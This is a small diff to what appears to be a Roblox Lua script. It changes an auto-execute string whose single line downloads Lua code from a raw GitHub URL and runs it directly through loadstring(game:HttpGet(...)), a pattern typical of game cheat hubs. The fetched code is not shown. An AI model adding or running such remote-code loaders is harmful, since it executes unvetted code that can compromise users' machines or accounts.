@@ -113,7 +113,7 @@ pcall(function()
 end)
 
 local AUTO_EXECUTE_LOADSTRING = [[
-loadstring(game:HttpGet('https://raw.githubusercontent.com/GUI-Offical/FileTest/refs/heads/main/ANHUB'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/GUI-Offical/FileTest/refs/heads/main/ANHUBB.lua'))()
 ]]
 
 local SOUND_URLS = {
